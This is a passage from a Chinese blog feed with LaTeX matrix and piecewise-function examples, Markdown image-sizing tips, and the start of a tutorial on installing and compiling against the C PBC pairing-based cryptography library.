style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><h3 id="大括号"><a class="markdownIt-Anchor" href="#大括号"></a> 大括号</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts">$$<br>\begin<span class="hljs-punctuation">&#123;</span>Bmatrix<span class="hljs-punctuation">&#125;</span><br><span class="hljs-number">0</span><span class="hljs-variable">&amp;1</span><span class="hljs-variable">&amp;2</span>\\<br><span class="hljs-number">3</span><span class="hljs-variable">&amp;4</span><span class="hljs-variable">&amp;5</span>\\<br><span class="hljs-number">6</span><span class="hljs-variable">&amp;7</span><span class="hljs-variable">&amp;8</span>\\<br>\end<span class="hljs-punctuation">&#123;</span>Bmatrix<span class="hljs-punctuation">&#125;</span><br>$$<br></code></pre></td></tr></table></figure><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>5</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>6</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>7</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>8</mn></mstyle></mtd></mtr></mtable><mo fence="true">}</mo></mrow><annotation encoding="application/x-tex">\begin{Bmatrix}0&amp;1&amp;2\\3&amp;4&amp;5\\6&amp;7&amp;8\\\end{Bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.49999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-2.20499em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-3.15001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.00501em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.30002em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">8</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.49999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎭</span></span></span><span style="top:-2.20499em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-3.15001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎬</span></span></span><span style="top:-4.00501em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.30002em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎫</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><h3 id="竖线行列式"><a class="markdownIt-Anchor" href="#竖线行列式"></a> 竖线(行列式)</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts">$$<br>\begin<span class="hljs-punctuation">&#123;</span>vmatrix<span class="hljs-punctuation">&#125;</span><br><span class="hljs-number">0</span><span class="hljs-variable">&amp;1</span><span class="hljs-variable">&amp;2</span>\\<br><span class="hljs-number">3</span><span class="hljs-variable">&amp;4</span><span class="hljs-variable">&amp;5</span>\\<br><span class="hljs-number">6</span><span class="hljs-variable">&amp;7</span><span class="hljs-variable">&amp;8</span>\\<br>\end<span class="hljs-punctuation">&#123;</span>vmatrix<span class="hljs-punctuation">&#125;</span><br>$$<br></code></pre></td></tr></table></figure><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">∣</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>5</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>6</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>7</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>8</mn></mstyle></mtd></mtr></mtable><mo fence="true">∣</mo></mrow><annotation encoding="application/x-tex">\begin{vmatrix}0&amp;1&amp;2\\3&amp;4&amp;5\\6&amp;7&amp;8\\\end{vmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.64199em;vertical-align:-1.5500299999999998em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0919600000000003em;"><span style="top:-1.05597em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-1.65697em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.2579700000000003em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.8589700000000002em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-3.45997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-3.4909600000000003em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-4.09196em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500299999999998em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">8</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0919600000000003em;"><span style="top:-1.05597em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-1.65697em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.2579700000000003em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.8589700000000002em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-3.45997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-3.4909600000000003em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-4.09196em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500299999999998em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><h3 id="双竖线"><a class="markdownIt-Anchor" href="#双竖线"></a> 双竖线</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts">$$<br>\begin<span class="hljs-punctuation">&#123;</span>Vmatrix<span class="hljs-punctuation">&#125;</span><br><span class="hljs-number">0</span><span class="hljs-variable">&amp;1</span><span class="hljs-variable">&amp;2</span>\\<br><span class="hljs-number">3</span><span class="hljs-variable">&amp;4</span><span class="hljs-variable">&amp;5</span>\\<br><span class="hljs-number">6</span><span class="hljs-variable">&amp;7</span><span class="hljs-variable">&amp;8</span>\\<br>\end<span class="hljs-punctuation">&#123;</span>Vmatrix<span class="hljs-punctuation">&#125;</span><br>$$<br></code></pre></td></tr></table></figure><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">∥</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>5</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>6</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>7</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>8</mn></mstyle></mtd></mtr></mtable><mo fence="true">∥</mo></mrow><annotation encoding="application/x-tex">\begin{Vmatrix}0&amp;1&amp;2\\3&amp;4&amp;5\\6&amp;7&amp;8\\\end{Vmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.64199em;vertical-align:-1.5500299999999998em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0919600000000003em;"><span style="top:-1.05597em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-1.65697em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-2.2579700000000003em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-2.8589700000000002em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-3.45997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-3.4909600000000003em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-4.09196em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500299999999998em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">8</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0919600000000003em;"><span style="top:-1.05597em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-1.65697em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-2.2579700000000003em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-2.8589700000000002em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-3.45997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-3.4909600000000003em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span><span style="top:-4.09196em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∥</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500299999999998em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><h2 id="分段函数"><a class="markdownIt-Anchor" href="#分段函数"></a> 分段函数</h2><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gml">$$<br>f(<span class="hljs-variable language_">x</span>) = <br>\<span class="hljs-keyword">begin</span>&#123;cases&#125;<br><span class="hljs-number">2</span><span class="hljs-variable language_">x</span>,\,\,<span class="hljs-variable language_">x</span>&gt;<span class="hljs-number">0</span>\\<br><span class="hljs-number">3</span><span class="hljs-variable language_">x</span>,\,\,<span class="hljs-variable language_">x</span>\le0\\<br>\<span class="hljs-keyword">end</span>&#123;cases&#125;<br>$$<br></code></pre></td></tr></table></figure><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>2</mn><mi>x</mi><mo separator="true">,</mo><mtext> </mtext><mtext> </mtext><mi>x</mi><mo>&gt;</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>3</mn><mi>x</mi><mo separator="true">,</mo><mtext> </mtext><mtext> </mtext><mi>x</mi><mo>≤</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">f(x) = \begin{cases}2x,\,\,x&gt;0\\3x,\,\,x\le0\\\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">2</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">3</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><h1 id="markdown"><a class="markdownIt-Anchor" href="#markdown"></a> Markdown</h1><h2 id="公式问题"><a class="markdownIt-Anchor" href="#公式问题"></a> 公式问题</h2><p>上标使用^，下标使用_，后面只能跟一个元素(字母、数字等)，如果有多个元素，则用{}括起来</p><h2 id="插入图片大小问题"><a class="markdownIt-Anchor" href="#插入图片大小问题"></a> 插入图片大小问题</h2><p>直接按照写html就行了</p><blockquote><p>在 HTML 中，<br />&lt;img&gt;标签用来定义图片，是空标签，意思是说，它只包含属性，并且没有闭合标签。<br />src指 “source”。源属性的值是图像的 URL 地址<br />alt属性用来为图像定义一串可替换的文本。无法载入图像时，替换文本告诉读者，他们失去的信息。<br />title属性描述了元素的额外信息 (作为工具条使用)<br />height(高度) 与 width(宽度) 属性用于设置图像的高度与宽度。<br />style属性规定元素的行内样式（inline style），定义图片时可以用来缩放<br />&lt;div&gt;标签用来定义文档中的一个分隔区块或者一个区域部分<br />align属性用来对齐，它的值有left、right、center、justify<br />原文链接：<a href="https://blog.csdn.net/wkd_007/article/details/">https://blog.csdn.net/wkd_007/article/details/</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html">缩小<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;zoom: 25%;&quot;</span> /&gt;</span><br><br>并列:<br><span class="hljs-tag">&lt;<span class="hljs-name">figure</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">200/</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">200/</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">200/</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">figure</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在fluild的用户手册中，发现了更方便的写法</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss">&#123;% gi total n1-n2-... %&#125;<br>  !<span class="hljs-selector-attr">[]</span>()<br>  !<span class="hljs-selector-attr">[]</span>()<br>  !<span class="hljs-selector-attr">[]</span>()<br>  !<span class="hljs-selector-attr">[]</span>()<br>&#123;% endgi %&#125;<br><br>total:一共有多少图片<br>n1-n2-...:每行的图片数量，不写默认每行最大为三，求和后不等于total也按默认来<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Markdown</category>
      
      <category>LaTex</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Markdown</tag>
      
      <tag>LaTex</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言PBC库</title>
    <link href="/2024/12/05/cPBC/"/>
    <url>/2024/12/05/cPBC/</url>
    
    <content type="html"><![CDATA[<h1 id="pbc"><a class="markdownIt-Anchor" href="#pbc"></a> PBC</h1><h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p><strong>我的环境是Ubantu-22.04,gcc-11.4.0</strong>(用vscode连虚拟机开发)<br />最近做毕设需要用到，就借此机会写一些关于c语言PBC库的教程，一些用法有结合GPT。<br />说是教程不过是把官方文档说的函数用法翻译了一遍，关于双线性配对的知识我不了解，这里就不将了，我看网上大部分说的有就只是当黑盒调用就行了。</p><blockquote><p>官方文档函数:<a href="https://crypto.stanford.edu/pbc/manual/">https://crypto.stanford.edu/pbc/manual/</a></p></blockquote><h2 id="安装和环境配置"><a class="markdownIt-Anchor" href="#安装和环境配置"></a> 安装和环境配置</h2><p>安装：</p><blockquote><p>参考:<a href="https://min.jeza-chen.com/2020/06/04/PBC-Library/">https://min.jeza-chen.com/2020/06/04/PBC-Library/</a></p></blockquote><p>按照官方文档，安装PBC库前需要安装GMP库，下面是上面这篇教程的按照方法，我用了之后没什么问题。</p><ol><li><p>安装 GMP库 <code>sudo apt-get install libgmp3-dev</code></p></li><li><p>安装flex和bison<code>sudo apt-get install flex, bison</code></p></li><li><p>安装编译PBC库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://crypto.stanford.edu/pbc/files/pbc-0.5.14.tar.gz<br>tar -zxvf pbc-0.5.14.tar.gz<br><span class="hljs-built_in">cd</span> pbc-0.5.14<br>./configure<br>make<br><span class="hljs-built_in">sudo</span> make install<br></code></pre></td></tr></table></figure></li></ol><p>环境配置：</p><ol><li>包含PBC的头文件<code>#include &lt;pbc/pbc.h&gt;</code></li><li>编译时，需要链接GMP库和PBC库，即再gcc时加上，<code>-lgmp -lpbc</code><br />(在tasks.json中的&quot;args&quot;里添加&quot;-lgmp&quot;和&quot;-lpbc&quot;即可)</li></ol><p>我遇到的问题：<br />error while loading shared libraries: libpbc.so.1: cannot open shared object file: No such file or directory</p><p>添加编译参数<code>-I/usr/local/include/pbc</code><br />(在tasks.json中的&quot;args&quot;里添加&quot;-I/usr/local/include/pbc&quot;)</p><p>先放一个例子，可以看看能不能运行成功，输出的三个结果应该一样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 